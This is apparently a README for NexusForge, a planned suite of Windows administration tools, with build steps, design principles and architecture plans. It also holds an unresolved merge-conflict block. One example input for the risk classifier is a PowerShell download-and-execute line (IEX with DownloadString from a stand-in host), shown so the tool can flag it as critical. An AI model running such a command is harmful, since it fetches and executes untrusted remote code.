# NexusForge





# **to run:**

###### **Clone this repository on your system.** 

&#x09;**git clone https://github.com/TheJ4nitorNG/NexusForge.git**



**run build\_release.bat**

&#x09;build\_release.bat will create all 3 .exe files 



&#x20; Part 1: Running SysMedic (The Diagnostics Engine)



&#x20; How it works:

&#x20; SysMedic loads the DiagnosticCoordinator, which runs your system health checks concurrently.

&#x20; Right now, it runs two real, non-mocked Windows diagnostics:

&#x20;  1. windows.storage.freespace (LogicalDiskSpaceCheck): Queries your local physical drives. It calculates free

&#x20;     percentages. It will trigger warnings if < 15% free space, and critical alerts if < 5%.

&#x20;  2. windows.services.critical (CriticalServicesCheck): Queries the real Windows Service Controller (ServiceController)

&#x20;     to check if critical OS system services (like WMI Winmgmt, RPC RpcSs, and EventLog) are running.



&#x20; How to run it:

&#x20; In your second terminal, run this command to start a full system scan:



&#x20;  1 dotnet run --project src\\Products\\SysMedic\\SysMedic.Cli\\SysMedic.Cli.csproj -- scan



&#x20; What you will see:

&#x20; An animated status loader as it runs, followed by a beautiful formatted Spectre.Console table containing the overall

&#x20; health score (0-100), passing/failing checks, and a list of actionable findings with recovery recommendations if any

&#x20; drives are full or services are stopped.



&#x20; ---



&#x20; Part 2: Running CMDPilot (The AI/Risk Classifier Engine)



&#x20; How it works:

&#x20; CMDPilot's RiskEngine accepts proposed shell commands and analyzes their safety before they execute. It uses the

&#x20; PowerShellAstAnalyzer to detect string obfuscation, extract called cmdlets from the AST (Abstract Syntax Tree), and

&#x20; evaluate risks.

&#x20; It will classify commands dynamically based on privilege requirements, destructive patterns, and known safe commands.



&#x20; How to run it (Try these 3 different profiles):



&#x20;  1. Test a Safe Command (Read-Only Process Retrieval):



&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "Get-Process |

&#x20;    Where-Object { \\$\_.CPU -gt 10 } | Select-Object ProcessName, CPU"

&#x20;     Result: It will identify this as SAFE (Green) because it uses known, read-only PowerShell commands.



&#x20;  2. Test an Unverified/Custom Script:



&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "Invoke-CustomDeploy

&#x20;    -Target 'ProdServer'"

&#x20;     Result: It will classify this as HIGH RISK (Orange) because the engine does not recognize Invoke-CustomDeploy as a

&#x20; verified safe command, prompting a warning about running unverified instructions.



&#x20;  3. Test a Critical Risk (Obfuscated String Injection):



&#x20;  1     dotnet run --project src\\Products\\CMDPilot\\CMDPilot.Cli\\CMDPilot.Cli.csproj -- analyze "IEX (New-Object

&#x20;    Net.WebClient).DownloadString('http://dangerous-payload.com')"

&#x20;     Result: It will flag this instantly as CRITICAL RISK (Red) because it detects runtime invocation (IEX /

&#x20; Invoke-Expression) and network download indicators, printing a strong security block warning.



#### Build. Diagnose. Automate. Resolve.


<<<<<<< HEAD
=======
To build run build_release.bat

Build. Diagnose. Automate. Resolve.
>>>>>>> 19531c7ff1efc44ebbe95fbe8ca8f634f65ebb32

NexusForge is a modular ecosystem of professional Windows tools built for system administrators, IT professionals, developers, power users, and incident responders.



The goal is simple:



Build tools that solve real problems, respect the user, and are powerful enough for professionals.



Rather than creating a collection of unrelated utilities, NexusForge provides a common foundation for a family of focused applications that can operate independently while sharing infrastructure, libraries, automation, diagnostics, reporting, and security capabilities.



#### The NexusForge Suite



Product	Purpose	Status

CMDPilot	Intelligent command-line and PowerShell assistance	🚧 In Development

SysMedic	Windows system diagnostics and troubleshooting	🚧 In Development

IncidentKit	Incident response, investigation, and evidence collection	🚧 In Development

CleanSlate	Storage analysis, cleanup, and disk management	🚧 In Development



Additional tools will be added as the platform evolves.



#### Why NexusForge?



Windows administrators and power users often rely on a fragmented collection of:



PowerShell scripts

One-off utilities

Diagnostic tools

System monitors

Cleanup applications

Documentation

Custom automation

Incident-response scripts

NexusForge aims to bring these capabilities together without turning them into one enormous, complicated application.



###### *Each tool has a specific purpose.*

###### 

###### *Each tool can stand on its own.*



And when multiple tools are used together, they can share information and capabilities through the NexusForge platform.



## Core Principles:



###### 1\. Useful Over Flashy:



Every feature should solve a real problem.



We are not interested in adding features simply because they look impressive on a marketing page.



##### 2\. Transparency Over Fear



NexusForge tools should tell users what they are doing and why.



We do not believe in:



Fake warnings

Artificial urgency

Misleading optimization claims

Invented system problems

Dark-pattern interfaces

If something is safe, explain why.



If something is potentially dangerous, say so.



If we don't know, say that too.



##### 3\. Safe by Default



Administrative software has the potential to cause serious damage when poorly designed.



NexusForge therefore emphasizes:



Least privilege

Explicit authorization

Dry-run modes

Preview workflows

Protected resources

Input validation

Reversible operations where possible

Detailed logging

Clear failure reporting

4\. Automation Without Losing Control

Automation should eliminate repetitive work—not eliminate understanding.



Where appropriate, NexusForge tools provide both:



###### Interactive Mode

&#x20;       +

###### CLI / PowerShell Automation

&#x20;       +

###### Structured Output



This allows the same capability to serve both an individual user and an experienced administrator.



##### 5\. Modular Architecture



Shared functionality should live in reusable libraries rather than being duplicated across applications.



Conceptually:



&#x20;                        NexusForge

&#x20;                             |

&#x20;            +----------------+----------------+

&#x20;            |                |                |

&#x20;         CMDPilot         SysMedic       IncidentKit

&#x20;            |                |                |

&#x20;            +----------------+----------------+

&#x20;                             |

&#x20;                        CleanSlate

&#x20;                             |

&#x20;                   NexusForge Platform

&#x20;                             |

&#x20;      +----------+-----------+-----------+----------+

&#x20;      |          |           |           |          |

&#x20;     Core     Security    Logging    Windows     Reporting



The actual dependency graph will remain intentionally more restrictive than the conceptual diagram above to prevent circular dependencies.



##### Architecture:



###### NexusForge is designed as a layered ecosystem.



┌────────────────────────────────────────────────────┐

│                    Applications                    │

│                                                    │

│ CMDPilot │ SysMedic │ IncidentKit │ CleanSlate     │

└───────────────────────┬────────────────────────────┘

&#x20;                       │

┌───────────────────────▼────────────────────────────┐

│                  Application Core                  │

│                                                    │

│ Workflows │ Services │ Domain Logic │ Policies     │

└───────────────────────┬────────────────────────────┘

&#x20;                       │

┌───────────────────────▼────────────────────────────┐

│                 NexusForge Platform                │

│                                                    │

│ Logging │ Configuration │ Security │ Reporting     │

│ Windows APIs │ Storage │ Process │ Networking      │

└───────────────────────┬────────────────────────────┘

&#x20;                       │

┌───────────────────────▼────────────────────────────┐

│                    Windows / .NET                  │

└────────────────────────────────────────────────────┘



###### **Technology:**



The initial platform is designed primarily around the Microsoft ecosystem.



##### Primary Stack:



C#

.NET 10

PowerShell

WinUI 3

SQLite

Windows APIs

MSBuild

GitHub Actions

Development Environment

Recommended:



###### **Windows 11**

Visual Studio 2026 or compatible .NET development environment

.NET 10 SDK

PowerShell 7+

Git

Repository Structure

The repository is organized around products and shared platform components.



NexusForge/

│

├── src/

│   │

│   ├── Products/

│   │   ├── CMDPilot/

│   │   ├── SysMedic/

│   │   ├── IncidentKit/

│   │   └── CleanSlate/

│   │

│   └── Platform/

│       ├── NexusForge.Core/

│       ├── NexusForge.Configuration/

│       ├── NexusForge.Logging/

│       ├── NexusForge.Security/

│       ├── NexusForge.Windows/

│       ├── NexusForge.Storage/

│       └── NexusForge.Reporting/

│

├── tests/

│   ├── Unit/

│   ├── Integration/

│   ├── Security/

│   └── EndToEnd/

│

├── docs/

│

├── build/

│

├── scripts/

│

├── assets/

│

├── .github/

│   └── workflows/

│

├── Directory.Build.props

├── Directory.Packages.props

├── global.json

├── LICENSE

└── README.md



The structure may evolve as implementation progresses.



#### Products:



###### **CMDPilot:**



Intelligent command-line assistance for Windows.



CMDPilot is designed to make PowerShell and command-line work faster, safer, and easier to understand.



Potential capabilities include:



Command explanation

PowerShell assistance

Command construction

Script analysis

Parameter explanations

Safe execution previews

Structured command output

Administrative workflows

Integration with other NexusForge tools

CMDPilot is intended to assist the administrator—not blindly execute commands on their behalf.



###### **SysMedic:**



Windows system diagnostics and troubleshooting.



SysMedic provides a structured way to investigate system problems.



Potential capabilities include:



Hardware diagnostics

Windows health checks

Service analysis

Event-log analysis

Process inspection

Network diagnostics

Storage health

System configuration checks

Repair recommendations

Diagnostic reports

The objective is to transform:



“Something is wrong with this PC.”



into:



“Here are the symptoms, likely causes, evidence, and recommended next steps.”



###### **IncidentKit:**



Incident response and technical investigation toolkit.



IncidentKit is designed for situations where a machine needs to be investigated systematically.



Potential capabilities include:



Evidence collection

System inventory

Process collection

Service inventory

Network state

Event-log collection

Timeline generation

Hashing

Evidence manifests

Case organization

Investigation reports

Evidence handling will prioritize reproducibility and integrity.



###### **CleanSlate:**



Storage intelligence and cleanup.



CleanSlate helps users understand where their storage is going and identify safe opportunities to reclaim space.



Potential capabilities include:



Storage visualization

Large-file discovery

Duplicate detection

Temporary-file analysis

Cache analysis

Downloads analysis

Recycle Bin management

Cleanup previews

Cleanup history

Storage trends

CLI automation

CleanSlate intentionally avoids the misleading behavior common in traditional “PC cleaner” applications.



###### **Shared Platform -**



The applications will share common infrastructure where doing so improves consistency and reliability.



Potential shared components include:



NexusForge.Core

Common abstractions and foundational types.



NexusForge.Logging

Structured logging and diagnostic events.



NexusForge.Configuration

Application and user configuration.



NexusForge.Security

Security policies, privilege management, validation, and authorization helpers.



NexusForge.Windows

Common Windows-specific functionality.



NexusForge.Storage

Shared filesystem and storage abstractions.



NexusForge.Reporting

Common report generation and export functionality.



CLI Philosophy

Command-line functionality is a first-class part of NexusForge.



Graphical applications are useful for discovery and interactive workflows.



CLI tools are essential for:



Automation

Scripting

IT administration

CI/CD

Troubleshooting

Remote management

Repeatable workflows

Whenever practical, CLI commands should support machine-readable output.



Example:



nexusforge sysmedic diagnose --json



or product-specific commands such as:



cleanslate scan --json



Output should be stable enough to support automation.



PowerShell

PowerShell is a major part of the NexusForge ecosystem.



PowerShell tooling should emphasize:



Discoverability

Safe defaults

Clear errors

Pipeline compatibility

Structured output

Documentation

Idempotent operations where practical

Example:



Get-NexusSystemHealth



or:



Get-NexusStorageReport



The exact command surface will be finalized during implementation.



##### **Security:**



Security is a core engineering requirement rather than an afterthought.



NexusForge applications may interact with:



System files

Processes

Services

Event logs

Registry settings

Network configuration

Security-related information

Potentially sensitive incident evidence

Accordingly, development will follow a least-privilege model.



Security priorities

Minimize elevation

Validate all external input

Avoid arbitrary command execution

Protect privileged IPC

Secure sensitive data

Avoid unnecessary telemetry

Sign production binaries

Secure update mechanisms

Maintain auditable logs

Treat collected evidence as potentially sensitive

Privacy

NexusForge should collect as little user data as practical.



Applications should not require cloud accounts for core functionality.



Where telemetry is eventually introduced, it should be:



Clearly documented

Purpose-limited

Configurable

Minimized

Free of unnecessary personal information

Local functionality should remain useful without telemetry.



###### **Testing:**



Reliability is especially important for administrative tools.



Testing will include:



Unit Tests

Testing individual components and business logic.



Integration Tests

Testing interaction with:



Windows APIs

Filesystems

Services

Event logs

Processes

Networking

SQLite

Security Tests

Testing:



Privilege boundaries

Input validation

Path handling

IPC

Command execution

Access control

End-to-End Tests

Testing complete user workflows.



###### **CI/CD:**



GitHub Actions will eventually provide automated:



Build

&#x20;  ↓

Unit Tests

&#x20;  ↓

Integration Tests

&#x20;  ↓

Security Checks

&#x20;  ↓

Packaging

&#x20;  ↓

Artifact Validation

&#x20;  ↓

Release



Pull requests should not be merged when required checks are failing.



###### **Versioning:**



NexusForge will use semantic versioning where appropriate:



MAJOR.MINOR.PATCH



Example:



1.0.0

1.1.0

1.1.1



Individual applications may have their own release versions while remaining associated with the broader NexusForge platform version.



Documentation

Architecture and engineering documentation lives under:



/docs



Current architecture documents include:



docs/

├── 01-cmdpilot-architecture-build-plan.md

├── 02-sysmedic-architecture-build-plan.md

├── 03-incidentkit-architecture-build-plan.md

└── 04-cleanslate-architecture-build-plan.md



Additional documentation will cover:



Architecture decisions

Development standards

Security model

Release process

CLI conventions

API contracts

Contribution guidelines

Testing strategy

Development Philosophy

NexusForge is being built with a simple rule:



Do the boring engineering correctly.



That means:



Good abstractions

Strong error handling

Comprehensive tests

Predictable behavior

Clear documentation

Defensive programming

Minimal privileges

Explicit failure modes

A tool used to troubleshoot or modify a computer should be dependable before it is clever.



Roadmap

Phase 1 — Foundation

Establish repository structure

Build shared platform libraries

Establish coding standards

Implement logging

Implement configuration

Establish CI

Establish testing infrastructure

Phase 2 — Core Products

Begin parallel development of:



CMDPilot

SysMedic

IncidentKit

CleanSlate

Phase 3 — Integration

Introduce common:



Reporting

Diagnostics

CLI conventions

Configuration

Security infrastructure

Inter-tool communication

Phase 4 — Release

Production installers

Code signing

Documentation

Release automation

Public beta

Stable releases

Contribution

NexusForge is being developed as a serious engineering project.



Before contributing code:



Read the relevant architecture documentation.

Understand the security implications of the change.

Add or update tests.

Keep changes focused.

Document externally visible behavior.

Do not introduce unnecessary dependencies.

More detailed contribution guidelines will be added as the project matures.



###### **License:**



The licensing model for NexusForge and its individual products is currently under development.



The final repository license will be established before the first public release.



Project Status

NexusForge is currently in active architecture and development planning.



The architecture documents represent the intended direction of the platform and will evolve as implementation exposes new requirements.



Nothing should be considered production-ready until the corresponding product has completed its testing, security review, and release process.



The Bigger Goal

NexusForge is not intended to be another collection of tiny Windows utilities.



The long-term goal is to create a coherent toolkit for people who actually have to operate, troubleshoot, automate, maintain, and investigate computers.



The individual products solve specific problems.



The platform connects them.



&#x20;                ┌──────────────┐

&#x20;                │   CMDPilot   │

&#x20;                └──────┬───────┘

&#x20;                       │

&#x20;                       ▼

┌──────────────┐  ┌──────────────┐  ┌──────────────┐

│   CleanSlate │◄─┤  NexusForge  ├─►│   SysMedic   │

└──────────────┘  └──────┬───────┘  └──────────────┘

&#x20;                        │

&#x20;                        ▼

&#x20;                 ┌──────────────┐

&#x20;                 │  IncidentKit │

&#x20;                 └──────────────┘



Build. Diagnose. Automate. Resolve.



Welcome to NexusForge.

